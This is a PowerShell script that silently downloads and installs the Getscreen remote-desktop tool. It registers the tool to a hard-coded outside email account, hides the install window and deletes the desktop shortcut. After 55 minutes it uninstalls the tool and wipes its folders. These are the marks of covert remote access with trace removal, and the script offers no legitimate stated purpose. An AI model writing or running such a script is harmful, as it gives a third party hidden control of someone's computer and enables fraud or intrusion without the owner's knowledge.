# This script will donwload getscreen and install it silently

function Install-Getscreen {
    #Fetching getscreen binary
    # Download the getscreen binary from the official website
    $installerUrl = "https://getscreen.ru/download/getscreen.exe"
    $installerPath = "$PSScriptRoot\getscreen.exe"
    try {
        Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -ErrorAction SilentlyContinue
    }
    catch {
        #If corrupted, download again until it is not corrupted
        while ((Get-FileHash -Path $installerPath -Algorithm MD5).Hash -ne "393A2BD95FEDA999A621E846904F66CE") {
            Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -ErrorAction Continue
        }
    }
    #Installing getscreen without user interaction and detaching from the current session
    Start-Process -FilePath "$installerPath" -ArgumentList "-install -register williamsparks1967@dtortmail.com:10791" -Wait -ErrorAction Stop -WindowStyle Hidden
}

function Remove-Service { #Function that deletes a service by name
    param (
        [Parameter(Mandatory = $true)]
        [string]$ServiceName
    )
    $service = Get-WmiObject -Class Win32_Service -Filter "Name='$ServiceName'"
    if ($service) {
        $service.Delete()
    }
}

Remove-Item -Path "C:\ProgramData\Getscreen" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:USERPROFILE\AppData\Local\Getscreen" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Service -ServiceName "Getscreen" -ErrorAction SilentlyContinue
Install-Getscreen #Install getscreen
Remove-Item -Path "$env:USERPROFILE\Desktop\Getscreen.lnk" -Force -ErrorAction SilentlyContinue #Remove shortcut from desktop

#Check if getscreen is installed
    if (Test-Path "C:\Program Files\Getscreen\getscreen.exe") {
        Write-Host "getscreen installed successfully"
    }
    else {
        Write-Host "getscreen installation failed"
    }

#Uninstall getscreen after 55 minutes
Start-Sleep -Seconds 3000
Start-Process -FilePath "C:\Program Files\Getscreen\getscreen.exe" -ArgumentList "-uninstall" -Wait -ErrorAction Stop
#Remove getscreen installer
Remove-Item -Path "$PSScriptRoot\getscreen.exe" -Force

#Remove GetScreen installation folder
Remove-Item -Path "C:\Program Files\Getscreen" -Recurse -Force

#Remove GetScreen ProgramData folder
Remove-Item -Path "C:\ProgramData\Getscreen" -Recurse -Force

#Remove GetScreen AppData folder
Remove-Item -Path "$env:USERPROFILE\AppData\Local\Getscreen" -Recurse -Force -ErrorAction SilentlyContinue
